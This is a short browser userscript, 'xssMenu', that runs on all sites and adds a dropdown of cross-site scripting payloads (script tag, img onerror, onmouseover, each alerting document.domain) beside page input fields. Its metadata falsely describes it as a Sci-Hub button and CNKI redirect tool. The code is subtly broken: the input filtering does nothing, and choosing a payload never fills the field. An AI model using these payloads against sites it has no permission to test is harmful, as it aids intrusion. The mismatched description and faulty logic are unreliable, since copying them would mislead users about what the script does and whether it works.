// ==UserScript==
// @name         xssMenu
// @namespace    hi
// @version      0.31
// @description  Add sci-hub button on article page. Add sci-hub button after article link. Support Google scholar, bing academic and baidu xueshu. Jump CNKI English article to Chinese article.
// @author       Dingar
// @include      *
// ==/UserScript==

var inputs = document.getElementsByTagName('input');
var payloads = [" ", "<script>alert(document.domain)</script>","<img src='#' onerror=alert(document.domain) />","<b onmouseover=alert(document.domain)>click me!</b>"];
var select_width = 200;
var select_height = 40;

for (let i = 0; i < inputs.length; i++) {
    if(inputs[i].type != "text"){
        delete inputs[i]
    }
}


function x(i, curVal) {
    document.getElementById("mySelect" + i).value = curVal;
}

for (let i = 0; i < inputs.length; i++) {
    var thisInput = inputs[i];
    var select = document.createElement("select");
    select.id = "mySelect" + i;
    var inputRect = thisInput.getBoundingClientRect();
    var selectX = inputRect.right + 65;
    var selectY = inputRect.top - 10;
    select.style = "position:absolute; top:" + selectY + "px; left:" + selectX + "px; background-color: #00ccff; border-radius: 10px; font-size: 20px; width:" + select_width + "px; height:" + select_height + "px";
    select.style.opacity = "0.9";
    for (let a = 0; a < payloads.length; a++) {
        var option = document.createElement("option");
        option.value = payloads[a];
        option.text = payloads[a];
        select.appendChild(option);
    }
    var curVal = select.value;
    select.onchange = function () {
        x(i, select.value);
    };
    inputs[i].parentNode.appendChild(select);
}
